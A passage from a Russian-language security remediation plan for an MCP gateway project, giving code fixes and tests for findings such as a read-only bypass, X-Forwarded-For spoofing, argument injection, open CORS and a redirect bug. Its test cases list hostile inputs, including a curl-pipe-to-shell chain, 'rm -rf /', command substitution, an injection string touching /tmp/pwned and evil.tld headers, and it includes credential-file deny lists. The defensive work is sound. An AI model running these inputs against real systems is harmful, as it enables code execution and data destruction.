`test_rotation_issues_a_link_key_once_and_only_shows_the_hash_afterwards`.

### 4.2. F-05. `_READ_ONLY` не покрывает `bash_exec`/`run_job`

**Место:** `core/mcp_tools.py:1847-1855` (`_tool_bash_exec`), `2553-2560` (`_tool_run_job`), для контраста —
`428-434` (`_write_guard`), `864` (обещание «every other mutation is refused too»), `2878-2889`
(share-инструменты), `2770` (`job_kill`). Комментарий-контракт шлюза — `gateway.py:2854-2855`.

```python
# было (core/mcp_tools.py:1847-1855)
def _tool_bash_exec(args):
    command = args.get("command")
    if not isinstance(command, str) or not command.strip():
        return {"error": "command is required and must be a non-empty string"}
    ...
    stdout_raw, stderr_raw, exit_code, duration = _run_bash(command, timeout)
```

```python
# стало
_READ_ONLY_ARGV0 = frozenset({
    "ls", "cat", "head", "tail", "grep", "find", "ps", "df", "free", "uptime",
    "whoami", "uname", "pwd", "hostname", "date", "wc", "stat", "du",
})
_READ_ONLY_SHELL_META = re.compile(r"[;&|`$()<>\n\r]")

def _read_only_command_guard(command: str) -> Optional[Dict[str, Any]]:
    """В read-only разрешено только наблюдение: argv[0] из списка, без shell-синтаксиса."""
    if not _READ_ONLY:
        return None
    if _READ_ONLY_SHELL_META.search(command):
        return {"error": "MESH_READ_ONLY is set: shell syntax (pipes, redirection, "
                         "substitution, chaining) is refused on this node"}
    try:
        argv = shlex.split(command, posix=not _IS_WINDOWS)
    except ValueError:
        return {"error": "MESH_READ_ONLY is set: the command could not be parsed"}
    if not argv or os.path.basename(argv[0]).lower() not in _READ_ONLY_ARGV0:
        return {"error": "MESH_READ_ONLY is set: only observation commands are allowed "
                         "(%s)" % ", ".join(sorted(_READ_ONLY_ARGV0))}
    return None
```

**Импорт:** `shlex` в `core/mcp_tools.py` сейчас не импортирован (блок импортов — строки 26-52) — добавить
`import shlex` (модуль стандартной библиотеки, новых зависимостей нет).

Та же проверка — первой строкой в `_tool_run_job` (до `MAX_RUNNING_JOBS` и `Popen`). Дополнительно:
исправить обещания в `core/mcp_tools.py:864` и `gateway.py:2854-2855` («MESH_READ_ONLY ограничивает
наблюдением; полная граница — ОС-пользователь агента»), иначе документация снова разойдётся с кодом.

**Совместимость:** ломается поведение, зафиксированное тестом `tests/test_mcp_tools.py:594`
(`test_run_job_read_only_still_runs_but_kill_blocked`) — тест нужно инвертировать. Операторы, использовавшие
read-only как «наблюдение», получат отказ на `pytest`/`git status` через `bash_exec`; для них в релизных
заметках описаны `read_file`/`list_dir`/`glob_find`/`grep_search` и новые инструменты наблюдения.
**Тесты:** `test_read_only_refuses_bash_exec_and_run_job` (оба инструмента возвращают `error` с
`MESH_READ_ONLY`, ничего не запускается — проверить через `monkeypatch` на `subprocess.Popen`),
`test_read_only_allows_observation_commands_only` (параметризация: `ls -la`, `cat README.md` — работают;
`cp /bin/sh /tmp/s`, `cat README.md; curl x | sh`, `echo $(id)`, `ls > /tmp/x` — отказ),
`test_read_only_writes_nothing_to_the_jobs_directory` (после отказа `jobs_dir` пуст).

### 4.3. F-06. Заявку привязки «забирает» любой Google-аккаунт

**Место:** `gateway.py:1236-1251` (`owner_pair_approve`; проверка `approved` — 1246-1248, approve — 1250),
`1041-1071` (`approve_pair`, `owner_subject` ставится только из аргумента — 1054-1055),
`gateway_identity.py:147-167` (`exchange`, проверки claims — 162-166). Документация обещает обратное:
`docs/GOOGLE_OWNER_ONBOARDING.md:109` («другой пользователь не может присвоить её»).

Правка 1 — allowlist владельцев (`gateway_identity.py`, после проверки claims на 162-166):

```python
# стало (новые поля класса OwnerAuth)
        self.owner_allowlist = {v.strip().lower() for v in
                                os.environ.get('MESH_OWNER_ALLOWLIST', '').split(',') if v.strip()}
        self.owner_hd = os.environ.get('MESH_OWNER_HD', '').strip().lower()

    def _owner_allowed(self, claims):
        if self.owner_hd and str(claims.get('hd') or '').lower() != self.owner_hd:
            return False
        if not self.owner_allowlist:
            return True
        email = str(claims.get('email') or '').lower()
        return 'google:' + claims['sub'] in self.owner_allowlist or email in self.owner_allowlist
```
и в `exchange`, сразу после блока 162-166: `if not self._owner_allowed(claims): raise ValueError(...)`.
`validate_config` (`gateway_identity.py:91-100`) дополняется: если `MESH_OWNER_ALLOWLIST`/`MESH_OWNER_HD`
заданы при выключенном OAuth — падать на старте.

Правка 2 — привязать approve к инициатору. Секрет установщика (`device_secret`, `gateway.py:962`) уже
существует и уже проверяется при выдаче (1000-1002), но браузер его не знает — поэтому подтвердить чужую
заявку может любой, кто увидел код. Делаем так: `device_pair_start` кладёт секрет в **фрагмент** `pair_url`
(`gateway.py:979`), фрагмент не уходит на сервер и не попадает в `Referer`/логи:

```python
# было (gateway.py:979)
        "pair_url": f"{PUBLIC_BASE_URL}/pair?code={code}",
# стало
        "pair_url": f"{PUBLIC_BASE_URL}/pair?code={code}#s={device_secret}",
```

`pairing_page` (`gateway.py:1203-1227`) не меняется: страница получает `code`, а секрет читает JS из
`location.hash` и кладёт в скрытое поле формы. `owner_pair_approve` требует его:

```python
# стало (gateway.py:1246-1251)
    if pair['approved']:
        if pair.get('owner_subject') != owner['subject']:
            return page('Заявка уже подтверждена', ..., status=409)
        return RedirectResponse('/account', status_code=303, ...)
    if not tokens_equal(hash_secret(data.get('s') or ''), pair['device_secret_sha256']):
        # Подтвердить заявку может только тот, кто её начал (у него есть секрет).
        return page('Заявка начата на другом устройстве',
                    '<p>Откройте ссылку, которую напечатал установщик, на этом устройстве.</p>',
                    status=403)
    approve_pair(code, pair, {}, owner['subject'])
```
плюс `rate_limited('owner_approve', f"{client_ip(request)}|{code}", limit=5)`.

Правка 3 (опционально, для простых развёртываний) — `MESH_OWNER_BIND_FIRST=1`: первый подтвердивший
становится владельцем, последующие другие аккаунты получают 409 и запись в лог.

**Совместимость:** установщик должен печатать ссылку с фрагментом (правка в `core/onboarding.py` —
`pair_url` берётся из ответа как есть, менять код узла не нужно), но старые установщики, сохранённые у
пользователей, ссылку без `#s=` не сформируют → на 4 недели вводится `MESH_PAIR_REQUIRE_INITIATOR=0`
(по умолчанию `1`), с предупреждением в лог.
**Тесты (`tests/test_gateway_credentials.py`, продолжение блока привязки):**
`test_an_owner_cannot_approve_a_pair_they_did_not_start` (approve с пустым/чужим `s` → 403, registry пуст),
`test_the_initiator_can_approve_with_the_secret_from_the_url_fragment` (200, `owner_subject` записан),
`test_a_second_google_account_cannot_take_over_an_approved_pair` (уже есть косвенно — расширить на
allowlist), `test_owner_login_refuses_an_account_outside_the_allowlist` (в `gateway_identity`-тестах:
`OwnerAuth.exchange` с подменённым `id_token.verify_oauth2_token` через `monkeypatch` → `ValueError`),
`test_owner_login_refuses_a_foreign_hosted_domain` (claims с `hd="other.tld"` → `ValueError`).

### 4.4. F-07. `X-Forwarded-For` обходит лимиты

**Место:** `gateway.py:747-751` (`client_ip`), `754-771` (`rate_limited`, `_rate_windows`), вызовы лимитов —
`782`, `944`, `1231`; `gateway_identity.py:76` (`MAX_STATES`), `128-129`; шаблон nginx —
`ops/nginx/remote-harness-mcp.conf:85,102,119,135,150`.

```python
# было (gateway.py:747-751)
def client_ip(request: Request) -> str:
    forwarded = (request.headers.get("x-forwarded-for") or "").split(",")[0].strip()
    if forwarded:
        return forwarded
    return request.client.host if request.client else "unknown"
```

```python
# стало
TRUSTED_PROXIES = tuple(p.strip() for p in
                        os.environ.get("MESH_TRUSTED_PROXIES", "127.0.0.1/8,::1/128").split(",") if p.strip())
TRUSTED_PROXY_HOPS = max(0, int(os.environ.get("MESH_TRUSTED_PROXY_HOPS", "1") or 1))

def _is_trusted_proxy(peer: str) -> bool:
    return any(ipaddress.ip_address(peer) in ipaddress.ip_network(net, strict=False)
               for net in TRUSTED_PROXIES) if peer != "unknown" else False

def client_ip(request: Request) -> str:
    """Адрес клиента, который нельзя подделать заголовком.

    XFF принимается только от собственного прокси, и из него берётся ПОСЛЕДНИЙ
    хоп (тот, что дописал прокси), а не первый (его пишет клиент).
    """
    peer = request.client.host if request.client else "unknown"
    if not TRUSTED_PROXY_HOPS or not _is_trusted_proxy(peer):
        return peer
    hops = [p.strip() for p in (request.headers.get("x-forwarded-for") or "").split(",") if p.strip()]
    if not hops:
        return peer
    return hops[-TRUSTED_PROXY_HOPS] if len(hops) >= TRUSTED_PROXY_HOPS else hops[0]
```
Дополнительно: лимиты для анонимных bucket'ов считать по подсети (`/24` для IPv4, `/64` для IPv6) — новый
`def client_network(request)` рядом, использовать в `rate_limited("register"...`, `"pair"`, `"owner_login"`.
Плюс `ops/nginx/...conf`: `$proxy_add_x_forwarded_for` → `$remote_addr` (5 строк). И `docs/SELF_HOSTED_GATEWAY_RU.md`:
описать `MESH_TRUSTED_PROXIES` (для docker-сети из `gateway.env.example:3` — `172.19.0.1`).

**Импорт:** `ipaddress` в `gateway.py` не импортирован (строки 1-17) — добавить `import ipaddress`.

**Совместимость:** при нескольких прокси-хопах без настройки `client_ip` начнёт возвращать адрес предыдущего
прокси — ложные срабатывания лимитов; поэтому в релиз-нотах обязательно `MESH_TRUSTED_PROXY_HOPS` и список CIDR.
**Тесты:** `test_client_ip_ignores_a_forged_x_forwarded_for` (peer `127.0.0.1`, XFF `1.2.3.4, 203.0.113.9` →
`203.0.113.9`), `test_client_ip_trusts_nothing_from_an_untrusted_peer` (новый: peer `203.0.113.50` → XFF
игнорируется), `test_a_forged_x_forwarded_for_does_not_reset_the_register_limit` (11 запросов с меняющимся
XFF → 429), `test_the_rate_limiter_evicts_expired_keys` (см. F-21).

### 4.5. F-08. Исчерпание пула заявок привязки

**Место:** `gateway.py:912-913` (`PAIR_TTL_SECONDS = 600`, `PAIR_MAX_PENDING = 200`), `941-954` (лимит 20/мин и
проверка размера пула), `926-931` (`purge_pairs`).

```python
# было (gateway.py:949-954)
    purge_pairs()
    if len(pending_pairs) >= PAIR_MAX_PENDING:
        return JSONResponse({"error": "too_many_pending", ...}, status_code=503)
```

```python
# стало
    purge_pairs()
    per_source = sum(1 for p in pending_pairs.values() if p.get("source") == client_ip(request))
    if per_source >= PAIR_MAX_PER_SOURCE:          # новый, напр. 5
        return JSONResponse({"error": "too_many_pending",
                             "message": "This address already has open pairing requests."},
                            status_code=429, headers={"Retry-After": "60"})
    if len(pending_pairs) >= PAIR_MAX_PENDING:
        oldest = min(pending_pairs, key=lambda c: pending_pairs[c]["created_at"])
        pending_pairs.pop(oldest, None)            # вытесняем старейшую заявку, а не отказываем всем
```
Поле `"source": client_ip(request)` добавляется в запись заявки (`gateway.py:963-974`).

**Совместимость:** `test_pairing_issues_nothing_before_an_admin_approves`
(`tests/test_gateway_credentials.py:232`) не затронут; `retry`-логика установщика (`core/onboarding.py`,
`pending['expires_at']`) не меняется. Новые тесты: `test_a_full_pair_pool_evicts_the_oldest_request`
(201 × POST → первая заявка исчезла, последняя жива), `test_one_address_cannot_hold_the_pool`
(6 заявок с одного IP → 429 + `Retry-After`).

### 4.6. F-09. Legacy-токен переживает ротацию

**Место:** `gateway.py:533-535` (`allow_legacy_query` в `verify_token`), `1084-1094` (`device_rotate`,
явный комментарий «deliberately survives»), `1121-1122`, `1157-1160`, `1179-1180`
(`request_credential` без проверки источника).

```python
# было (gateway.py:1084-1094)
    entry["link_key"] = new_link_key()
    if entry.get("token"):
        entry["token_sha256"] = hash_secret(entry["token"])
        entry.pop("token", None)
    # `allow_legacy_query` deliberately survives: ...

# стало
    entry["link_key_sha256"] = hash_secret(new_link_key())
    entry.pop("link_key", None)
    if entry.get("token"):
        entry["token_sha256"] = hash_secret(entry["token"])
        entry.pop("token", None)
    # Ротация ссылки - это и есть обещание «прежняя ссылка перестанет работать»:
    # legacy-приём device-token в query умирает вместе с ней.
    entry.pop("allow_legacy_query", None)
```
И для state-changing эндпоинтов — требовать заголовок:

```python
# было (gateway.py:1121-1122 и аналоги 1081, 1157, 1179)
    supplied, _source = request_credential(request)
    if not (admin_authorised(request) or token_matches_device(entry, supplied)):

# стало
    supplied, source = request_credential(request)
    if source == "query" and not admin_authorised(request):
        return JSONResponse({"error": "credential_in_header_required",
                             "message": "Send the device token in an Authorization: Bearer header."},
                            status_code=403)
    if not (admin_authorised(request) or token_matches_device(entry, supplied)):
```

**Совместимость (высокая):** ломается `tests/test_gateway_credentials.py:304-329`
(`test_reinstalling_a_legacy_node_keeps_its_existing_url_working` — он утверждает, что старая URL-форма
продолжает работать) — тест переписывается под новую семантику: после `rotate` старая query-форма даёт
`401`, а установщик при повторной регистрации выдаёт `lk_`-ссылку. Для операторов: смена поведения
описывается в `docs/releases/`; узлы, вставленные в коннектор как `?token=<device>`, требуют замены URL —
это ровно то, что обещает UI. Тесты: `test_rotate_retires_the_legacy_query_credential`,
`test_rotate_token_and_revoke_refuse_a_query_credential` (403 при `?token=`), `test_a_header_credential_still_works_for_rotate`.

### 4.7. F-10. `share_file`/`serve_dir` публикуют конфиг

**Место:** `core/web_share.py:570-585` (`share_file`: проверяется только существование файла),
`642-656` (`serve_dir`: блокируется только собственный storage), `330-337` (`_inside`).

```python
# стало, рядом с _inside
#: Каталоги, которые нельзя публиковать никогда: там лежат MESH_TOKEN и link key.
_FORBIDDEN_DIR_MARKERS = (
    os.path.join('.config', 'remote-harness-mcp'),
    os.path.join('.remote-harness-mcp'),
)
_FORBIDDEN_NAMES = frozenset({'agent.env', '.env', 'registry.json', 'shares.json',
                              'onboarding.receipt.json', 'credentials.json', 'id_ed25519'})

def _forbidden_publication(path: str) -> str:
    real = os.path.realpath(path)
    lowered = real.lower()
    if any(marker.lower() in lowered for marker in _FORBIDDEN_DIR_MARKERS):
        return "the node configuration directory holds the device token"
    if os.path.basename(real).lower() in _FORBIDDEN_NAMES:
        return "this file holds credentials"
    return ""
```
Вызов — в `share_file` после `source = os.path.realpath(...)` (строка 574) и в `serve_dir` после `root = ...`
(строка 646), с тем же форматом ошибки, что уже используется (`{"error": "..."}`).

**Совместимость:** пользователи, которые осознанно публиковали `.env` примеров, получат отказ; обход —
`MESH_WEB_ALLOW_CONFIG=1` (не рекомендуется, пишется в лог). Тесты (`tests/test_web_share.py`):
`test_share_file_refuses_the_agent_env_and_the_registry` (параметризация по
`~/.config/remote-harness-mcp/agent.env`, `.env`, `shares.json`, `id_ed25519`; каталог подменяется через
`MESH_WEB_DIR`/`tmp_path`), `test_serve_dir_refuses_the_config_directory`
(аналогично `test_serve_dir_refuses_the_share_storage`, строка 254), `test_an_ordinary_file_is_still_shared`
(контроль, чтобы запрет не стал слишком широким).

---

## 5. P2 — F-11…F-25 (67 ч)

### 5.1. F-11. Payload без подписи, версия ≠ GitHub

**Место:** `gateway.py:1319-1344` (`installer_asset`: allowlist имён, но ни подписи, ни хэшей);
`install.sh:957-973` (цикл `curl -fSL "https://${GATEWAY}/${f}"`, 23 файла); `install.ps1:823-875` (тот же
список через `Invoke-WebRequest`).

Правка:
1. `installer_asset` дополнительно отдаёт `/SHA256SUMS` и `/SHA256SUMS.minisig` (имена добавляются в
   `allowed`, `gateway.py:1324-1327`; файлы генерируются на сборке из git-чекаута, а не из отдаваемых байт).
2. Подпись — offline-ключ `minisign` в CI (`.github/workflows/release.yml`), публичный ключ **вшит в
   `install.sh`** рядом с `PUBLISHED_DOMAIN`.
3. `install.sh` после загрузки, до `cp -R` (строки 975-979), проверяет: `sha256sum -c` и
   `minisign -Vm SHA256SUMS -p <pinned pubkey>`; при отсутствии `minisign` — отказ с подсказкой
   `--allow-unverified` (явный флаг, по умолчанию выключен). То же в `install.ps1` (через
   `Get-FileHash` + проверку подписи, либо тот же minisign, если он есть).
4. Честно задокументировать bootstrap-проблему: `install.sh` сам приезжает с того же домена, поэтому
   дополнительно публиковать его SHA-256 в релизных заметках GitHub и поддерживать установку из
   git-чекаута (`docs/CI.md`).

**Тесты (`tests/test_installer_bootstrap.py`):** `test_the_installer_verifies_the_payload_signature` (новая
фикстура `payload_server`: локальный `http.server` с фальшивым `SHA256SUMS`/подписью; скрипт запускается
через `subprocess` с `GATEWAY=127.0.0.1:<port>`), `test_a_tampered_module_aborts_the_install` (хэш не
совпадает → ненулевой код, `core/` не создан), `test_the_published_hashes_match_the_repository` (сверка
`SHA256SUMS` с файлами репозитория).

### 5.2. F-12. Инъекция аргументов в `bin/cli.js`

**Место:** `bin/cli.js:93-115`: `rawArgs` (94) экранирует только `"`; на Windows — `[scriptblock]::Create($s)`
со склейкой (100), на POSIX — `bash -c "curl … | bash -s -- ${rawArgs}"` (108-111).

Правка: скачивать установщик в файл и запускать интерпретатор с массивом аргументов, без shell:

```js
// вместо launchRemoteInstaller (bin/cli.js:93-115)
const INSTALL_URL = 'https://racknerd-5a24bf9.merino-carob.ts.net';
function launchRemoteInstaller(args) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'rhm-install-'));
  if (isWindows) {
    const file = path.join(dir, 'install.ps1');
    return download(`${INSTALL_URL}/install.ps1`, file).then(() => spawnSync(
      'powershell.exe',
      ['-NoProfile', '-ExecutionPolicy', 'Bypass', '-File', file, ...args],
      { stdio: 'inherit' }));
  }
  const file = path.join(dir, 'install.sh');
  return download(`${INSTALL_URL}/install.sh`, file).then(() => spawnSync(
    'bash', [file, ...args], { stdio: 'inherit' }));
}
```
где `download(url, file)` — `https.get` в поток с проверкой `res.statusCode` и таймаутом; `args`
передаются позиционно, каждый аргумент — отдельный элемент массива. `spawnSync` заменяется на `spawn` с
теми же аргументами, если нужен стриминговый вывод.

**Тесты:** в проекте нет JS-раннера (`.github/workflows/ci.yml` гоняет только pytest), поэтому добавляется
статический guard в `tests/test_installer_bootstrap.py`:
`test_the_cli_never_pastes_arguments_into_a_shell` — в `bin/cli.js` нет подстрок `bash', ['-c'` и
`[scriptblock]::Create`, есть `'-File'`; плюс ручная проверка (в §9) с аргументом
`-Gateway 'x"; touch /tmp/pwned; echo "'`.

### 5.3. F-13. Standalone-сервер: пустой токен, нет `Origin`

**Место:** `core/server.py:707-710` (ACAO `*`), `751-779` (`_token_valid` возвращает `True` при пустом токене,
`_authorized`), `840-864` (`do_POST` без проверки `Content-Type`), `903-918` (`auth_token = token or ""`),
`963-967` (только предупреждение).

Правка (fail-closed):
- `_token_valid`: `if not self.auth_token: return bool(self.server_allow_no_auth)` — новый атрибут класса,
  выставляется только явным `--allow-no-auth`.
- `_authorized` дополнительно проверяет `Host` (allowlist `{127.0.0.1:port, localhost:port, [::1]:port}`) и,
  для POST, `Origin` (отсутствие `Origin` допустимо, значение — только из allowlist; `null` отклоняется).
- `do_POST`: требовать `Content-Type: application/json` (`_JSONRPC_POST_PATHS`), `Content-Length <=
  MESH_STANDALONE_MAX_BODY` (по умолчанию 1 MiB) — иначе `413`.
- `_cors_headers`: вместо `*` — эхо валидированного `Origin`.
- `main`: `--token` обязателен, если хост не loopback; без токена и без `--allow-no-auth` — выход с ошибкой
  (а не предупреждение).

**Совместимость (высокая):** `python -m core.server --host 127.0.0.1` без токена перестанет принимать вызовы.
Термукс-ветка (`tests/test_termux_support.py:426` проверяет строку запуска
`-m core.server --host 127.0.0.1 --port=8096`) требует обновления лаунчера — новый тест на это обязателен.
**Тесты (`tests/test_mcp_endpoints.py`, новые):** `test_a_tokenless_standalone_server_refuses_jsonrpc`
(`_token_valid()` False при пустом токене и выключенном флаге), `test_a_foreign_origin_cannot_post_jsonrpc`
(`Origin: http://evil.tld` → 403), `test_a_rebinding_host_header_is_refused` (`Host: evil.tld:8096` → 403),
`test_a_text_plain_post_is_refused` (CSRF-простой запрос → 415), `test_the_termux_launcher_passes_a_token`
(строка запуска содержит `--token`).

### 5.4. F-14. Нет лимитов relay шар

**Место:** `gateway.py:3441` (`base64.b64decode` всего тела), `3592-3597` (`ws_max_size=128 MiB`),
`core/web_share.py:85-88` (`DEFAULT_MAX_BYTES`/`MAX_MAX_BYTES`), `532-546` (лимит читается на узле).

Правка: на шлюзе — свой лимит и семафор; `ws_max_size` снижается до «лимит × 4/3 + запас»:

```python
SHARE_RELAY_MAX_BYTES = int(os.environ.get("MESH_SHARE_MAX_BYTES", str(32 * 1024 * 1024)))
SHARE_RELAY_SLOTS = asyncio.Semaphore(int(os.environ.get("MESH_SHARE_CONCURRENCY", "4")))

async with SHARE_RELAY_SLOTS:
    result = await call_remote_tool(user, "_http_share", {...})
...
    if len(body) > SHARE_RELAY_MAX_BYTES:
        return _share_response(413, "share exceeds the gateway relay limit")
```
Семафор создаётся лениво (в `lifespan`, `gateway.py:3558-3585`) или через `asyncio.Semaphore()`, взятый в
момент запроса, — чтобы не привязывать его к событийному циклу на импорте модуля: тесты вызывают обработчики
через `asyncio.run(...)` в разных циклах.

Отдельное решение — `ws_max_size`. Здесь есть связанное ограничение: существующий тест
`tests/test_web_share.py::test_the_transport_cap_carries_the_share_ceiling` (строки 384-400) требует
`wire_cap >= MAX_MAX_BYTES * 4 / 3`, а `MAX_MAX_BYTES` сегодня 64 MiB (`core/web_share.py:88`) — то есть
≥ 85,3 MiB. Поэтому «просто понизить `ws_max_size`» — неверный ход; возможны два согласованных варианта:

| Вариант | Что меняется | `ws_max_size` | Что придётся править в тестах |
| :--- | :--- | ---: | :--- |
| Минимальный | ничего, только квоты на шлюзе (`SHARE_RELAY_MAX_BYTES`, семафор) | 96 MiB (вместо 128) | ничего; выигрыш только в памяти при параллельных запросах |
| Рекомендуемый | `MAX_MAX_BYTES` → 32 MiB и `DEFAULT_MAX_BYTES` → 16 MiB (`core/web_share.py:85-88`), `SHARE_RELAY_MAX_BYTES` = 32 MiB | 48 MiB | `test_the_transport_cap_carries_the_share_ceiling` (инвариант сохраняется: 42,7 ≤ 48) и `test_the_published_limits_are_the_raised_ones` (377-381, жёстко фиксирует 32/64 MiB — обновить числа и текст) |

Рекомендуемый вариант нужен потому, что 128 MiB-кадр на публичном маршруте без аутентификации — это
усилитель DoS: несколько параллельных запросов держат ws-кадр + JSON + раскодированные байты в одном
процессе, где живут все туннели (`gateway.py:3592-3595` — комментарий об этом прямо).

**Тесты:** `test_the_relay_refuses_a_body_above_the_gateway_limit` (413, тело не декодируется повторно),
`test_concurrent_share_relays_are_bounded` (5 параллельных вызовов при `MESH_SHARE_CONCURRENCY=2` →
не более 2 одновременных `call_remote_tool`), `test_the_transport_cap_covers_the_relay_limit` (обновлённый).

### 5.5. F-15. Политика подтверждений по префиксу

**Место:** `core/policies.py:38-52` (`SAFE_COMMAND_PREFIXES`), `94-98` (`is_safe_command`), `54-63`
(`DESTRUCTIVE_COMMAND_PATTERNS`), `116-133` (порядок политик).

```python
# было (core/policies.py:94-98)
def is_safe_command(args: dict) -> bool:
    cmd = _extract_command(args)
    if not cmd:
        return False
    return any(cmd.startswith(prefix) for prefix in SAFE_COMMAND_PREFIXES)

# стало
SAFE_ARGV0 = frozenset({"git", "systemctl", "uptime", "ls", "ps", "cat", "echo",
                        "whoami", "uname", "df", "free"})
_SHELL_META = re.compile(r"[;&|`$()<>\n\r]")

def is_safe_command(args: dict) -> bool:
    cmd = _extract_command(args)
    if not cmd or _SHELL_META.search(cmd) or is_destructive_command(args):
        return False
    try:
        argv = shlex.split(cmd, posix=(os.name != "nt"))
    except ValueError:
        return False
    if not argv or os.path.basename(argv[0]).lower() not in SAFE_ARGV0:
        return False
    return True
```
**Импорт:** `shlex` в `core/policies.py` не импортирован (строки 1-3) — добавить `import shlex`.

`SAFE_COMMAND_PREFIXES` удаляется (или остаётся как документация `argv0`+первый аргумент и больше не
используется). Для POSIX дополнительно ограничить `git`/`systemctl` подкомандами (`git status|log|diff`,
`systemctl status`), чтобы `git push` не проходил без вопроса.

**Тесты (`tests/test_policies.py`; файл вызывает `pytest.importorskip("google.antigravity")`, потому что
`core/policies.py:4-6` импортирует SDK — новые тесты попадут в skip на Linux-раннере, это ожидаемо):**
`test_a_chained_command_is_not_safe` (`cat README.md; curl … | sh`, `ls && rm -rf /`, `echo $(id)`),
`test_a_backtick_substitution_is_not_safe`, `test_a_redirect_is_not_safe` (`ls > /tmp/x`),
`test_a_plain_observation_command_is_still_safe` (`ls -la`, `git status`, `uptime`),
`test_a_destructive_command_is_never_safe` (`rm -rf x` не проходит ни как safe, ни как allow).

### 5.6. F-16…F-25 — точечные правки

| ID | Место | Правка | Тест |
| :--- | :--- | :--- | :--- |
| F-16 | `gateway.py:2831-2832` | `if name == "location": if not text.startswith("/") or text.startswith("//") or text.startswith("/\\"): continue` — иначе `Location: //evil.tld` уводит браузер | `test_a_protocol_relative_location_is_dropped` (`tests/test_gateway_share_route.py`); существующий `test_a_relative_location_is_relayed…` (576) должен продолжать проходить |
| F-17 | `gateway.py:721`, `732` | fail-closed: `REGISTER_MODE not in {"open", "pair", "closed"}` → считать `"closed"` и писать `logger.error` при старте; `if REGISTER_MODE != "open" or owner_auth.configured:` — отказ. Переменная читается один раз при импорте, поэтому значение валидируется на старте, а не в обработчике | `test_an_unknown_register_mode_is_closed` (`REGISTER_MODES` параметризованно: `closed`, `pairs`, `""`, `OPEN `), существующий `test_registration_response_has_no_subdomain` не ломается |
| F-18 | `gateway.py:915`, `921-923`, `1074-1143` | (1) `admin_authorised` требует второй фактор для `rotate`/`revoke`: заголовок `X-Admin-Confirm` = `MESH_ADMIN_CONFIRM` (или TOTP `MESH_ADMIN_TOTP_SECRET`); (2) админский `rotate` возвращает **маскированный** ключ и требует `MESH_ADMIN_ROTATE_ALLOW=1`, иначе 403 с подсказкой «ротацию выполняет владелец в /account»; (3) каждая админская ротация пишет audit-строку `logger.warning` с субъектом | `test_admin_rotation_needs_the_second_factor`, `test_admin_rotation_does_not_hand_out_a_working_key`, `test_the_node_itself_can_still_rotate` |
| F-19 | `gateway.py:1028-1037` | перенести `data = await request.json()` (1031-1036) **выше** проверки `if pair["approved"]` (1028). После этого между проверкой и `approve_pair` (в которой нет `await`, см. docstring 1042) нет точек переключения — дубликат узла невозможен без блокировок | `test_two_concurrent_approvals_create_one_node` (две задачи `asyncio.gather` на один код → один узел, второй ответ `409/200-идемпотент`) |
| F-20 | `gateway.py:791-794`, `692-698`, `1043` | `if not clean_user or len(clean_user) < 2 or len(clean_user) > 40: 400`; в `unique_node_name` обрезать базу так, чтобы `base + "-NN"` ≤ 40 | `test_a_too_long_username_is_refused`, `test_auto_suffix_stays_within_the_limit` |
| F-21 | `gateway.py:754-771` | добавить `_RATE_MAX_KEYS = int(env MESH_RATE_MAX_KEYS, 4096)`; при превышении — выбросить все ключи, у которых нет отметок в текущем окне; если всё ещё превышение — выбросить половину самых старых | `test_the_rate_window_map_is_bounded` (10 000 разных XFF → `len(gateway._rate_windows) <= _RATE_MAX_KEYS`) |
| F-22 | `core/redact.py:24`, `43`, `62` | `_NOT_A_SECRET` переписать так, чтобы ссылка на переменную и плейсхолдер оставались, а `$ecret` редактировался; `{8,}` → `{4,}` для key=value-паттерна; в `_mask` не пропускать значение только из `$`, если после `$` не идентификатор (точный шаблон — в примечании под таблицей) | `test_a_short_password_is_redacted` (`password: abc1`), `test_a_dollar_prefixed_secret_is_redacted` (`token: $ecret123`), `test_a_pure_variable_reference_is_kept` (`token: $MESH_TOKEN`), существующий `test_variable_references_and_placeholders_are_kept` (34) должен остаться зелёным |
| F-23 | `gateway.py:1347-1372` | `base = PUBLIC_BASE_URL` (вместо `https://{request.headers['host']}`), `Cache-Control: no-store` (метаданные зависят от хоста, публичный кэш бессмысленен и опасен) | `test_discovery_uses_the_configured_origin_not_the_request_host` (`Host: evil.tld` → `resource == PUBLIC_BASE_URL`) |
| F-24 | `gateway.py:66`, `668` | `INSTANCE_ID = hashlib.sha256(f"{hostname}:{pid}:{uuid4()}".encode()).hexdigest()[:12]`; полный `hostname:pid` остаётся только в приватном/админском ответе | `test_health_never_leaks_the_hostname` (`tests/test_gateway_resilience.py`) |
| F-25 | `gateway.py:985-1012` | `pair["collected"]` учитывать: `pair["collect_count"] = pair.get("collect_count", 0) + 1`; при `collect_count > MESH_PAIR_MAX_COLLECT (по умолчанию 3)` или при повторе позже `PAIR_REPEAT_WINDOW` (60 с) после первого получения — `410 pair_collected` | `test_a_pair_code_stops_handing_out_keys_after_the_repeat_window`; **изменить** `test_pairing_issues_once_and_allows_same_device_to_retry` (`tests/test_gateway_credentials.py:256-279`), который сейчас требует бесконечного повтора: оставить один немедленный повтор и добавить проверку отказа после окна |

**Примечание к F-22.** Точный `_NOT_A_SECRET` (заменяет `core/redact.py:24`; ссылка на переменную и
плейсхолдер сохраняются, `$ecret123` — нет):

```python
_NOT_A_SECRET = re.compile(
    r"^\$(?:\{[A-Za-z_][A-Za-z0-9_]*\}|[A-Za-z_][A-Za-z0-9_]*)$"
    r"|^<[^<>]{1,64}>$"
)
```

Проверка на реальных значениях: `$MESH_TOKEN` → не трогаем; `${HOME}` → не трогаем; `<compute-ip>` → не
трогаем; `$ecret123` → `<REDACTED>`; `abc1` → `<REDACTED>` (после снижения порога до 4).

---

## 6. Тест-план

### 6.1. Новые и изменённые файлы

| Файл | Статус | Что добавляется |
| :--- | :--- | :--- |
| `tests/test_gateway_share_route.py` | расширить | 5 тестов F-01, 3 теста F-02 (шаровая часть), F-16, F-14 (relay) |
| `tests/test_gateway_credentials.py` | расширить | F-02 (401/409), F-04 (5 тестов), F-06 (5), F-08 (2), F-09 (3), F-25 (изменение) |
| `tests/test_gateway_resilience.py` | расширить | F-03 (4), F-21, F-24 |
| `tests/test_gateway_url_contract.py` | расширить | F-23 |
| `tests/test_web_share.py` | расширить | F-10 (3), F-14 (лимит), F-01(б) (домен шар) |
| `tests/test_mcp_tools.py` | изменить | F-05: инверсия `test_run_job_read_only_still_runs_but_kill_blocked` (594) |
| `tests/test_policies.py` | расширить | F-15 (5 тестов; skip без SDK) |
| `tests/test_redact.py` | расширить | F-22 (3) |
| `tests/test_installer_bootstrap.py` | расширить | F-11 (3), F-12 (1 статический guard) |
| `tests/test_mcp_endpoints.py` | расширить | F-13 (5) |
